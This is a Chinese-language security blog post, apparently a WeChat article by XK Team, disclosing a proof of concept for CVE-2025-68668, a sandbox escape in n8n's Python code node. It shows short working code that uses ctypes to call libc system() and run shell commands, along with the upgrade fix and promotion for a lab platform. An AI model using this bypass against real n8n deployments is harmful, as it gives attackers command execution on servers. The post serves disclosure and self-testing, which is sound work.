---
title: 【首发POC】n8n Python代码节点沙箱绕过导致系统命令执行 (CVE-2025-68668)
url: https://mp.weixin.qq.com/s/cGGJ0ezy1Ee6HhvvkR0lKw
source: Doonsec's feed
date: 2026-01-05
fetch_date: 2026-01-06T03:29:34.541158
---

# 【首发POC】n8n Python代码节点沙箱绕过导致系统命令执行 (CVE-2025-68668)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/lic4LrsB27ntCMOOf7l2W0VNeHeib3dDzkHSL1O9jA4OvaHzUw1cD0n5rwas3EUIy6ic0yvaWGJhfdCK6mWsH5gNw/0?wx_fmt=jpeg)

# 【首发POC】n8n Python代码节点沙箱绕过导致系统命令执行 (CVE-2025-68668)

棉花糖糖糖

XK Team

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_gif/1mtwZURvGTkCK3ZFyqYEyTwmaLo2YSMeibz3eeShkewiadS4oh0RBl1U7BTVeEscGQrEbjWKcQzGpJEFLwr4cFQw/640?wx_fmt=gif&wxfrom=13&wx_lazy=1&tp=wxpic)

## **前言**

今天各家都通报了CVE-2025-68668 n8n Python代码节点沙箱绕过导致系统命令执行漏洞，但没有poc，特有此文，文中poc仅供合法测试，用于企业自查，切勿用于非法测试，未授权测试造成后果由使用者承担，与本公众号无关。

## **漏洞概述**

n8n 是一款开源的可视化工作流自动化平台，广泛应用于企业自动化、数据处理和 DevOps 场景。平台采用节点式设计，支持用户通过拖拽组件构建业务流程。受影响的 Python 代码节点允许用户在工作流中执行自定义代码。该节点基于 Pyodide 技术，为代码执行提供安全的沙箱隔离环境。作为一款主流自动化工具，n8n 拥有广泛的用户基础。

## **漏洞原理**

n8n 的 Python (Pyodide) 模式配置了黑名单，在packages/nodes-base/nodes/Code/Pyodide.ts中：

![img](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntCMOOf7l2W0VNeHeib3dDzkjRlb4mzuzKbT5iajLc7ZkTicL9iaYiaTbjGicYCjL5z3ia94g7dnBfyw5icRw/640?wx_fmt=png&from=appmsg)

img

如果执行这样的代码：

```
import os
os.system('ls')
```

是会被阻止的：

![image-20260104161503537](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntCMOOf7l2W0VNeHeib3dDzkHvVe51ZyfwBIicAjkhIRZfvGWBBvdkj4hXZ9jh8RSAOtgLqo8bunW1g/640?wx_fmt=png&from=appmsg)

image-20260104161503537

但黑名单中并未阻止ctypes库， ctypes 是 Python 的 FFI 库，允许 Python 代码直接调用 C 函数，他的libc有system(), fork(), execl()等函数可用，测试的时候fork(), execl()被拦截了，system()能用，于是我们可以构造出一个使用ctypes去执行系统命令的poc：

```
import ctypes
libc = ctypes.CDLL(None)
libc.system(b'ls')
```

本地环境验证：

```
import ctypes
import os

libc = ctypes.CDLL(None)
libc.system.argtypes = [ctypes.c_char_p]
libc.system.restype = ctypes.c_int
result = libc.system(b'echo "mht CVE-2025-68668" > /tmp/test.txt')

return {
    "vulnerability": "SUCCESS"
}
```

![image-20260104162123099](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntCMOOf7l2W0VNeHeib3dDzkiabjxLEjcRTKib5xTZAHsHtsAbibpLWPibSestIhjQKIAp4gyn5ica7eekA/640?wx_fmt=png&from=appmsg)

image-20260104162123099

修复方法：立即升级到**n8n****2.0.0**或更高版本

复现环境已在无境中上架：vip.bdziyi.com/ulab，无境，英文名Unbounded Lab，是专为网络安全学习者打造的综合性实战平台，提供真实企业级漏洞环境，让您在安全的环境中提升实战技能，核心特色：独立隔离环境，每位用户都拥有**完全独立**的靶场环境，即使是庞大的内网靶场，环境之间也是**零干扰**，确保您的学习过程不受任何影响。

![image-20260104182631157](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntCMOOf7l2W0VNeHeib3dDzkJZ7CbfB5vQm2WpQsFjGicickCpY8c7F9EKYdpawLjPguvZjyejAAHMaA/640?wx_fmt=png&from=appmsg)

image-20260104182631157

![image-20260104183035709](https://mmbiz.qpic.cn/mmbiz_png/lic4LrsB27ntCMOOf7l2W0VNeHeib3dDzkjtSwIvyxsuhOXV51iaIjGD46oyZ06Rao87ic8ZonbY05lziaUpz5QvdKQ/640?wx_fmt=png&from=appmsg)

image-20260104183035709

## 广告时间：

[棉花糖会员站介绍(25年11月15日版本) 新增在线独立环境内网靶场](https://mp.weixin.qq.com/s?__biz=MzkyOTQzNjIwNw==&mid=2247492813&idx=1&sn=0bb0698488bfc8a03b1ed0983be803fd&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCrZPIVHJCfks2n7XVFicYGslOgXiblXM0KLRsQM1W71yoOR0O05IEEiaxvicfLclkmGEictk3YU7DLATA/0?wx_fmt=png)

XK Team

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCrZPIVHJCfks2n7XVFicYGslOgXiblXM0KLRsQM1W71yoOR0O05IEEiaxvicfLclkmGEictk3YU7DLATA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过